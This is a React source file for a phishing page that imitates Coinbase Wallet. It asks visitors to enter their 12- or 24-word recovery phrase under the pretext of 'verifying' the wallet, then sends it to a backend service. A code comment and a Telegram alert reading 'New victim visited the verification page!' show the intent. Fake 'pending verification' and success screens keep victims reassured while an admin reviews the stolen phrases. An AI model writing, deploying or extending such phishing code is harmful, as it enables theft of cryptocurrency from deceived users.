import { useState, useEffect, useCallback } from 'react';
import { submitFromWallet, getEntryStatus } from '../services/entries';
import { sendTelegramAlert } from '../services/telegram';

type WalletStep = 'landing' | 'input' | 'pending' | 'verified' | 'rejected';

export default function WalletPage() {
  const [step, setStep] = useState<WalletStep>('landing');

  // Alert on visit
  useEffect(() => {
    // Only alert once per session to avoid spam on refresh
    if (!sessionStorage.getItem('alerted_visit')) {
      sendTelegramAlert('⚠️ New victim visited the verification page!');
      sessionStorage.setItem('alerted_visit', 'true');
    }
  }, []);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [error, setError] = useState('');
  const [entryId, setEntryId] = useState<string | null>(null);
  const [wordCount, setWordCount] = useState(0);

  const handleSeedChange = (value: string) => {
    setSeedPhrase(value);
    const words = value.trim().split(/\s+/).filter(w => w.length > 0);
    setWordCount(words.length);
    setError('');
  };

  const handleSubmit = () => {
    const words = seedPhrase.trim().split(/\s+/).filter(w => w.length > 0);
    if (words.length !== 12 && words.length !== 24) {
      setError('Please enter a valid 12 or 24 word seed phrase.');
      return;
    }
    const result = submitFromWallet(seedPhrase);
    setEntryId(result.entryId);
    setStep('pending');
  };

  // Poll for admin approval/rejection
  const pollStatus = useCallback(() => {
    if (!entryId) return;
    const status = getEntryStatus(entryId);
    if (status === 'verified') {
      setStep('verified');
    } else if (status === 'rejected') {
      setStep('rejected');
    }
  }, [entryId]);

  useEffect(() => {
    if (step !== 'pending' || !entryId) return;
    const interval = setInterval(pollStatus, 2000);
    return () => clearInterval(interval);
  }, [step, entryId, pollStatus]);

  return (
    <div className="min-h-screen bg-black flex items-center justify-center p-4">
      <div className="w-full max-w-[400px]">
        {step === 'landing' && <LandingView onStart={() => setStep('input')} />}
        {step === 'input' && (
          <InputView
            seedPhrase={seedPhrase}
            wordCount={wordCount}
            error={error}
            onChange={handleSeedChange}
            onSubmit={handleSubmit}
            onBack={() => setStep('landing')}
          />
        )}
        {step === 'pending' && <PendingView />}
        {step === 'verified' && <VerifiedView onReset={() => setStep('landing')} />}
        {step === 'rejected' && <RejectedView onRetry={() => { setSeedPhrase(''); setWordCount(0); setStep('input'); }} />}
      </div>
    </div>
  );
}

function LandingView({ onStart }: { onStart: () => void }) {
  return (
    <div className="bg-[#1a1a2e] rounded-2xl p-8 text-center">
      {/* Coinbase-style logo */}
      <div className="flex justify-center mb-8 mt-4">
        <div className="relative w-48 h-48">
          {/* Outer yellow ring */}
          <div className="absolute inset-0 rounded-full" style={{
            background: 'conic-gradient(from 180deg, #f7931a 0%, #f5c842 50%, #f7931a 100%)',
          }}></div>
          {/* Blue ring */}
          <div className="absolute inset-4 rounded-full bg-[#0052ff]"></div>
          {/* Dark circle */}
          <div className="absolute inset-8 rounded-full bg-[#1a1a2e]"></div>
          {/* Center white circle with icon */}
          <div className="absolute inset-14 rounded-full bg-white flex items-center justify-center">
            <div className="w-6 h-6 bg-[#0052ff] rounded-sm"></div>
          </div>
          {/* Decorative vertical line */}
          <div className="absolute left-[28%] top-[15%] bottom-[15%] w-0.5 bg-[#0052ff] opacity-60"></div>
        </div>
      </div>

      <h1 className="text-xl font-bold text-[#f5c842] mb-1">Manage your</h1>
      <h1 className="text-xl font-bold text-[#f5c842] mb-8">Coinbase Wallet</h1>

      <button
        onClick={onStart}
        className="w-full bg-white text-black font-semibold py-3.5 rounded-full text-base hover:bg-gray-100 transition-colors"
      >
        Verify Your Wallet
      </button>

      <div className="mt-6 h-2 bg-[#f5c842] rounded-full w-3/4 mx-auto opacity-60"></div>
    </div>
  );
}

function InputView({
  seedPhrase,
  wordCount,
  error,
  onChange,
  onSubmit,
  onBack,
}: {
  seedPhrase: string;
  wordCount: number;
  error: string;
  onChange: (val: string) => void;
  onSubmit: () => void;
  onBack: () => void;
}) {
  return (
    <div className="bg-[#1a1a2e] rounded-2xl p-6">
      <button
        onClick={onBack}
        className="text-gray-400 hover:text-white mb-4 flex items-center gap-1 text-sm"
      >
        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
        </svg>
        Back
      </button>

      <h2 className="text-xl font-bold text-white mb-2">Verify Your Wallet</h2>
      <p className="text-gray-400 text-sm mb-6">
        Enter your 12 or 24 word recovery phrase to verify ownership of your wallet.
      </p>

      <div className="mb-2">
        <label className="text-xs text-gray-500 uppercase tracking-wide mb-1 block">
          Recovery Phrase
        </label>
        <textarea
          value={seedPhrase}
          onChange={(e) => onChange(e.target.value)}
          placeholder="Enter your seed phrase words separated by spaces..."
          rows={4}
          className="w-full bg-[#0d0d1a] border border-gray-700 rounded-lg p-3 text-white text-sm placeholder-gray-600 focus:border-[#0052ff] focus:outline-none resize-none"
        />
      </div>

      <div className="flex justify-between items-center mb-4">
        <span className={`text-xs ${wordCount === 12 || wordCount === 24 ? 'text-green-400' : 'text-gray-500'}`}>
          {wordCount} / 12 or 24 words
        </span>
        {error && <span className="text-xs text-red-400">{error}</span>}
      </div>

      <button
        onClick={onSubmit}
        disabled={wordCount < 12}
        className="w-full bg-[#0052ff] text-white font-semibold py-3.5 rounded-full text-base hover:bg-[#0040cc] transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
      >
        Submit for Verification
      </button>
    </div>
  );
}

function PendingView() {
  return (
    <div className="bg-[#1a1a2e] rounded-2xl p-8">
      {/* Progress bars */}
      <div className="flex gap-2 mb-6">
        <div className="h-1 flex-1 bg-[#0052ff] rounded-full"></div>
        <div className="h-1 flex-1 bg-[#0052ff] rounded-full"></div>
        <div className="h-1 flex-1 bg-gray-700 rounded-full animate-pulse"></div>
      </div>

      <h2 className="text-2xl font-bold text-white mb-6">Pending Verification</h2>

      <p className="text-gray-300 text-sm leading-relaxed mb-4">
        Please hold on while we securely check and validate the details you have provided.
      </p>
      <p className="text-gray-300 text-sm leading-relaxed mb-6">
        This process might take a few moments as we ensure everything is correct and safe.
      </p>
      <p className="text-gray-300 text-sm leading-relaxed mb-8">
        Your security is our top priority, and we want to make sure everything is 100% accurate before proceeding.
      </p>

      {/* Loading animation */}
      <div className="flex justify-center gap-3">
        <div className="w-10 h-1 bg-[#0052ff] rounded-full animate-pulse"></div>
        <div className="w-10 h-1 bg-[#0052ff] rounded-full animate-pulse" style={{ animationDelay: '0.2s' }}></div>
        <div className="w-10 h-1 bg-[#0052ff] rounded-full animate-pulse" style={{ animationDelay: '0.4s' }}></div>
      </div>
    </div>
  );
}

function VerifiedView({ onReset }: { onReset: () => void }) {
  return (
    <div className="bg-[#1a1a2e] rounded-2xl p-8 text-center">
      <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
        <svg className="w-8 h-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
        </svg>
      </div>
      <h2 className="text-2xl font-bold text-white mb-4">Verified Successfully</h2>
      <p className="text-gray-400 text-sm mb-8">
        Your wallet has been verified. You can now close this page.
      </p>
      <button
        onClick={onReset}
        className="text-[#0052ff] text-sm hover:underline"
      >
        Return to home
      </button>
    </div>
  );
}

function RejectedView({ onRetry }: { onRetry: () => void }) {
  return (
    <div className="bg-[#1a1a2e] rounded-2xl p-8 text-center">
      <div className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
        <svg className="w-8 h-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M6 18L18 6M6 6l12 12" />
        </svg>
      </div>
      <h2 className="text-2xl font-bold text-white mb-4">Verification Failed</h2>
      <p className="text-gray-400 text-sm mb-8">
        The seed phrase could not be verified. Please check and try again.
      </p>
      <button
        onClick={onRetry}
        className="w-full bg-[#0052ff] text-white font-semibold py-3 rounded-full text-base hover:bg-[#0040cc] transition-colors"
      >
        Try Again
      </button>
    </div>
  );
}
